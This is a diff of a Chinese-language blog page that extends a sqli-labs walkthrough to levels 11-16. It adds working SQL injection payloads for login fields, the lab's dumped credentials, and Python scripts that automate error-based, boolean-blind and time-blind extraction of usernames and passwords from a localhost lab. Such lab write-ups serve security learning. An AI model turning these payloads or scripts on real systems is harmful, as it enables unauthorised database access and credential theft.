@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="LESS 11 基于字符串的注入（POST）输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=’’ LIMIT 0">
+<meta name="description" content="LESS 11 基于字符串的注入（POST）在username栏输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=">
 <meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs less11">
+<meta property="og:title" content="sqli-labs less11-16">
 <meta property="og:url" content="http://yoursite.com/2018/05/29/sqli-labs-less11/index.html">
 <meta property="og:site_name" content="Lilin">
-<meta property="og:description" content="LESS 11 基于字符串的注入（POST）输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=’’ LIMIT 0">
+<meta property="og:description" content="LESS 11 基于字符串的注入（POST）在username栏输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-29T13:25:53.672Z">
+<meta property="og:updated_time" content="2018-06-01T07:55:13.556Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs less11">
-<meta name="twitter:description" content="LESS 11 基于字符串的注入（POST）输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=’’ LIMIT 0">
+<meta name="twitter:title" content="sqli-labs less11-16">
+<meta name="twitter:description" content="LESS 11 基于字符串的注入（POST）在username栏输入单引号’测试,结果：  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=">
 
 
 
@@ -126,7 +126,7 @@
 
 
 
-  <title>sqli-labs less11 | Lilin</title>
+  <title>sqli-labs less11-16 | Lilin</title>
   
 
 
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs less11</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs less11-16</h1>
         
 
         <div class="post-meta">
@@ -353,10 +353,44 @@
       
 
       
-        <h1 id="LESS-11-基于字符串的注入（POST）"><a href="#LESS-11-基于字符串的注入（POST）" class="headerlink" title="LESS 11 基于字符串的注入（POST）"></a>LESS 11 基于字符串的注入（POST）</h1><p>输入单引号’测试,结果：</p>
+        <h1 id="LESS-11-基于字符串的注入（POST）"><a href="#LESS-11-基于字符串的注入（POST）" class="headerlink" title="LESS 11 基于字符串的注入（POST）"></a>LESS 11 基于字符串的注入（POST）</h1><p>在username栏输入单引号’测试,结果：</p>
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
+<p>猜测查询语句为：select * from users where username = ‘$username’ and password=’$password’ LIMIT 0,1<br>于是乎构造payload：</p>
+<blockquote>
+<p>Username :     0’ union select group_concat(username),group_concat(password) from users#<br>Password :     </p>
+</blockquote>
+<p>结果：</p>
+<blockquote>
+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
+</blockquote>
+<h1 id="LESS-12-基于双引号字符串的注入（POST）"><a href="#LESS-12-基于双引号字符串的注入（POST）" class="headerlink" title="LESS 12 基于双引号字符串的注入（POST）"></a>LESS 12 基于双引号字符串的注入（POST）</h1><p>和上一关的不同在于字符串被双引号和括号包围，通过报错讯息可以知道<br>payload如下：</p>
+<blockquote>
+<p>Username :     0”) union select group_concat(username),group_concat(password) from users#<br>Password :<br><a id="more"></a></p>
+</blockquote>
+<h1 id="LESS-13-双查询注入（POST）"><a href="#LESS-13-双查询注入（POST）" class="headerlink" title="LESS 13 双查询注入（POST）"></a>LESS 13 双查询注入（POST）</h1><p>通过报错信息可以知道字符串被一对单引号和一对括号包围，但是成功后不显示信息，只会显示报错信息，于是使用双查询注入：</p>
+<blockquote>
+<p>Username :     0’) union select count(<em>), CONCAT_WS(CHAR(32,58,32),(select count(</em>) from users),floor(rand()*2)) as a from users group by a#<br>Password :     </p>
+</blockquote>
+<p>结果：</p>
+<blockquote>
+<p>Duplicate entry ‘13 : 1’ for key ‘group_key’’</p>
+</blockquote>
+<p>可以构造脚本爆表:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-13/"</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">13</span>):</span><br><span class="line">    data = &#123;<span class="string">"uname"</span>:<span class="string">"0') union select count(*), CONCAT_WS(CHAR(32,124,32),(select username from users limit "</span>+str(i)+<span class="string">",1),(select password from users limit "</span>+str(i)+<span class="string">",1),floor(rand()*2)) as a from users group by a#"</span>, <span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">    response = request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">    info = re.search(<span class="string">r"[^']+\s\|\s[^\s]+?"</span>, response)</span><br><span class="line">    <span class="keyword">if</span>(info == <span class="keyword">None</span>):</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(info.group())</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>结果：</p>
+<blockquote>
+<p>Dumb | Dumb | 0<br>Angelina | I-kill-you | 1<br>Dummy | p@ssword | 0<br>secure | crappy | 1<br>stupid | stupidity | 1<br>superman | genious | 0<br>batman | mob!le | 1<br>admin | admin | 0<br>admin1 | admin1 | 0<br>admin2 | admin2 | 1<br>admin3 | admin3 | 1<br>dhakkan | dumbo | 1<br>admin4 | admin4 | 0</p>
+</blockquote>
+<h1 id="LESS-14-双引号双查询注入（POST）"><a href="#LESS-14-双引号双查询注入（POST）" class="headerlink" title="LESS 14 双引号双查询注入（POST）"></a>LESS 14 双引号双查询注入（POST）</h1><p>除了把单引号括号改成双引号外和上一关没什么区别，payload：</p>
+<blockquote>
+<p>Username :     0” union select count(<em>), CONCAT_WS(CHAR(32,58,32),(select count(</em>) from users),floor(rand()*2)) as a from users group by a#<br>Password :     </p>
+</blockquote>
+<p>其他的和十三关都是一样的</p>
+<h1 id="LESS-15-基于布尔的盲注（POST）"><a href="#LESS-15-基于布尔的盲注（POST）" class="headerlink" title="LESS 15 基于布尔的盲注（POST）"></a>LESS 15 基于布尔的盲注（POST）</h1><p>POST盲注，第七关的脚本拿过来改一下即可：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-15/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(value)</span>:</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = &#123;<span class="string">"uname"</span>:<span class="string">"' or length("</span>+str(value)+<span class="string">")="</span>+str(length)+<span class="string">"#"</span>, <span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">        response = request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"slap"</span>, response)):</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(value)</span>:</span></span><br><span class="line">    dbname = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(getLength(value)):</span><br><span class="line">        a = <span class="number">64</span></span><br><span class="line">        b = <span class="number">64</span></span><br><span class="line">        <span class="comment">#使用二分法构造动态参数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            b = int(b/<span class="number">2</span>)</span><br><span class="line">            data = &#123;<span class="string">"uname"</span>:<span class="string">"' or ascii(substr("</span> + value + <span class="string">","</span> + str(n+<span class="number">1</span>) + <span class="string">"))&lt;"</span> + str(a) + <span class="string">"#"</span>, <span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">            response = request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"slap"</span>, response)):</span><br><span class="line">                data[<span class="string">"uname"</span>] = <span class="string">"' or ascii(substr("</span> + value + <span class="string">","</span> + str(n+<span class="number">1</span>) + <span class="string">"))="</span> + str(a) + <span class="string">"#"</span></span><br><span class="line">                response = request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">"slap"</span>, response)):</span><br><span class="line">                    a += b</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dbname = dbname + chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a -= b</span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line"></span><br><span class="line">print(getName(<span class="string">"(select group_concat(username) from users)"</span>))</span><br><span class="line">print(getName(<span class="string">"(select group_concat(password) from users)"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>结果和第八关一样</p>
+<h1 id="LESS-16-基于时间的盲注（POST）"><a href="#LESS-16-基于时间的盲注（POST）" class="headerlink" title="LESS 16 基于时间的盲注（POST）"></a>LESS 16 基于时间的盲注（POST）</h1><p>结合第九关的脚本，再改一下上一关的脚本就成了本关的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-15/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(value)</span>:</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = &#123;<span class="string">"uname"</span>:<span class="string">"' or if(length("</span>+value+<span class="string">")="</span>+str(length)+<span class="string">",sleep(0.1),1)#"</span>, <span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">        t = time.time()</span><br><span class="line">        request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">        <span class="keyword">if</span> (time.time()-t &lt;= <span class="number">0.1</span>):</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(value)</span>:</span></span><br><span class="line">    dbname = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(getLength(value)):</span><br><span class="line">        a = <span class="number">64</span></span><br><span class="line">        b = <span class="number">64</span></span><br><span class="line">        <span class="comment">#使用二分法构造动态参数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            b = int(b/<span class="number">2</span>)</span><br><span class="line">            data = &#123;<span class="string">"uname"</span>:<span class="string">"' or if(ascii(substr("</span>+value+<span class="string">","</span>+str(n+<span class="number">1</span>)+<span class="string">"))&lt;"</span>+str(a)+<span class="string">",sleep(0.1),1)#"</span>, <span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (time.time()-t &lt;= <span class="number">0.1</span>):</span><br><span class="line">                data[<span class="string">"uname"</span>] = <span class="string">"' or if(ascii(substr("</span>+value+<span class="string">","</span>+str(n+<span class="number">1</span>)+<span class="string">"))="</span>+str(a)+<span class="string">",sleep(0.1),1)#"</span></span><br><span class="line">                t = time.time()</span><br><span class="line">                request.urlopen(url, parse.urlencode(data).encode()).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (time.time()-t &lt;= <span class="number">0.1</span>):</span><br><span class="line">                    a += b</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dbname = dbname + chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a -= b</span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line"></span><br><span class="line">print(getName(<span class="string">"(select group_concat(username) from users)"</span>))</span><br><span class="line">print(getName(<span class="string">"(select group_concat(password) from users)"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>速度太慢，不知道有什么好的改进方法</p>
 
       
     </div>
@@ -396,6 +430,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/01/sqli-lab-less17-22/" rel="prev" title="20180601160642">
+                20180601160642 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -476,7 +514,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -547,7 +585,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-11-基于字符串的注入（POST）"><span class="nav-number">1.</span> <span class="nav-text">LESS 11 基于字符串的注入（POST）</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-11-基于字符串的注入（POST）"><span class="nav-number">1.</span> <span class="nav-text">LESS 11 基于字符串的注入（POST）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-12-基于双引号字符串的注入（POST）"><span class="nav-number">2.</span> <span class="nav-text">LESS 12 基于双引号字符串的注入（POST）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-13-双查询注入（POST）"><span class="nav-number">3.</span> <span class="nav-text">LESS 13 双查询注入（POST）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-14-双引号双查询注入（POST）"><span class="nav-number">4.</span> <span class="nav-text">LESS 14 双引号双查询注入（POST）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-15-基于布尔的盲注（POST）"><span class="nav-number">5.</span> <span class="nav-text">LESS 15 基于布尔的盲注（POST）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-16-基于时间的盲注（POST）"><span class="nav-number">6.</span> <span class="nav-text">LESS 16 基于时间的盲注（POST）</span></a></li></ol></div>
             
 
           </div>
